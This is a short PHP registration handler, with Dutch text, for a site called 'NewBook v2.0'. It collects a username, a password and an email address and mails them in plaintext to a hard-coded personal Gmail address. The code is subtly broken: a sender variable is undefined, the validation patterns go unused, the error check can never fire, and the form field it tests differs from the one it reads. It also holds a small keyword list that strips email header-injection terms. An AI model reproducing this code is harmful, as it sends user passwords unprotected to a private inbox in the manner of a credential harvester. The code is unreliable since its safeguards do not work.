<?php
if(isset($_POST['email_address'])) {
    $email_to = "patrickdevos14@gmail.com";
    $email_subject = "Registratie NewBook v2.0";

    function died($error) {
        echo "Helaas, klopt er iets niet in het registratie formulier."; 
        die();
    }
 

    $gebruikersnaam = $_POST['gebruikersnaam']; // required
    $wachtwoord = $_POST['wachtwoord']; // required
	$emailadresl = $_POST['emailadresl']; //
    $error_message = "";
	
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
    $string_exp = "/^[A-Za-z .'-]+$/";
 
  if(strlen($error_message) > 0) {
    died($error_message);
  }

    $email_message = "Registratie formulier details hieronder:.\n\n"; 

    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }
 
     
 
    $email_message .= "Gebruikersnaam: ".clean_string($gebruikersnaam)."\n";
    $email_message .= "Wachtwoord: ".clean_string($wachtwoord)."\n";
    $email_message .= "Email adres: ".clean_string($emailadresl)."\n"; 
 
 
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers);  
?>
 
 
 
<!-- succes message -->
 
 
<p>Bedankt voor het registreren</p>
 
 
 
<?php
}
?>